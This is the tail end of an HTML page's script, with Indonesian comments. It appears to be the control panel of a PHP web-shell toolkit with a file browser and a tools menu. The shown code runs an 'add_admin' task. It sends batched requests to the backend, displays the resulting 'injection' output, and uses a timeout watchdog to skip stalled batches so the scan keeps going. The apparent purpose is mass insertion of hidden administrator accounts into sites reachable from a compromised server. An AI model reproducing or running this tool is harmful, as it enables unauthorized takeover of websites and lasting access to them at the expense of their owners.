            logMsg("CHAIN ERROR: " + e, "text-danger");
        }
    }
    
    // --- LOGIKA BARU ADD ADMIN GUI ---
const addAdminModal = new bootstrap.Modal(document.getElementById('addAdminModal'));

function openAddAdminUI() {
    toolsModal.hide(); // Tutup menu toolkit
    // Reset tampilan
    document.getElementById('admin-result-body').innerHTML = '<div class="text-center text-secondary py-5 opacity-50"><i class="fas fa-robot fa-3x mb-3"></i><br>Results will appear here...</div>';
    document.getElementById('admin-prog').style.width = '0%';
    document.getElementById('admin-processed').innerText = '0';
    document.getElementById('admin-total').innerText = '0';
    document.getElementById('admin-status-txt').innerText = 'Ready.';
    addAdminModal.show();
}

function startAddAdminTask() {
    const mode = document.getElementById('admin-target-select').value;
    const resBody = document.getElementById('admin-result-body');
    
    // Kunci tombol agar tidak dobel klik
    document.getElementById('admin-status-txt').innerHTML = '<span class="text-warning"><i class="fas fa-spinner fa-spin me-2"></i>Scanning...</span>';
    resBody.innerHTML = ''; // Bersihkan log awal
    
    processAdminBatch(0, mode);
}

// --- FUNGSI PROSES DENGAN WATCHDOG (ANTI-MACET) ---
function processAdminBatch(step, mode) {
    const limit = 5; // Sesuai dengan limit di PHP backend
    const timeoutSeconds = 15000; // 15 Detik batas waktu per batch

    // 1. Setup Watchdog (Pengaman)
    const controller = new AbortController();
    const timeoutId = setTimeout(() => {
        controller.abort(); // Matikan paksa request jika macet
        
        // Update UI info macet
        document.getElementById('admin-status-txt').innerHTML = `<span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Timeout at #${step}. Skipping...</span>`;
        
        // REKURSI PENTING: Lompati batch ini (step + limit) dan lanjut scan
        processAdminBatch(step + limit, mode); 
    }, timeoutSeconds);

    // 2. Request ke Backend
    // Perhatikan penambahan 'signal: controller.signal' untuk menghubungkan watchdog
    api('tool', currentPath, 'GET', {
        'X-Tool': 'add_admin',
        'X-Step': step,
        'X-Mode': mode
    }, null, controller.signal) // <--- SIGNAL WATCHDOG
    .then(r => r.json())
    .then(res => {
        clearTimeout(timeoutId); // Matikan timer jika sukses sebelum 15 detik

        const resBody = document.getElementById('admin-result-body');
        
        // Update Total
        if (res.total) document.getElementById('admin-total').innerText = res.total;
        
        // Tampilkan HTML hasil injeksi
        if (res.html) {
            resBody.innerHTML += res.html;
            resBody.scrollTop = resBody.scrollHeight;
        }

        // Update Progress Bar
        let currentPos = res.current || (step + limit);
        let pct = (res.total > 0) ? Math.round(currentPos / res.total * 100) : 0;
        if(pct > 100) pct = 100;
        
        document.getElementById('admin-prog').style.width = pct + '%';
        document.getElementById('admin-processed').innerText = Math.min(currentPos, res.total || 0);

        // Logika Lanjut atau Selesai
        if (res.status === 'continue') {
            document.getElementById('admin-status-txt').innerHTML = `<span class="text-info"><i class="fas fa-sync fa-spin"></i> Processing ${res.next_step}...</span>`;
            processAdminBatch(res.next_step, mode);
        } else {
            // SELESAI
            document.getElementById('admin-prog').style.width = '100%';
            document.getElementById('admin-status-txt').innerHTML = '<span class="text-success fw-bold"><i class="fas fa-check-circle me-2"></i>COMPLETED</span>';
            showToast('Add Admin Process Finished!', 'success');
        }
    })
    .catch(e => {
        // Handle Error (Termasuk Timeout)
        if (e.name === 'AbortError') {
            // Ini terjadi karena kita abort manual di setTimeout, biarkan fungsi timeout yang menangani skip
            return; 
        }

        // Jika error jaringan lain (bukan timeout), kita tetap skip agar tidak stop total
        clearTimeout(timeoutId);
        document.getElementById('admin-status-txt').innerHTML = `<span class="text-danger">Net Error at #${step}. Skipping batch...</span>`;
        
        // LOMPATI BATCH MACET
        setTimeout(() => {
            processAdminBatch(step + limit, mode);
        }, 1000);
    });
}
    
    loadDir('');
</script>
</body>
</html>
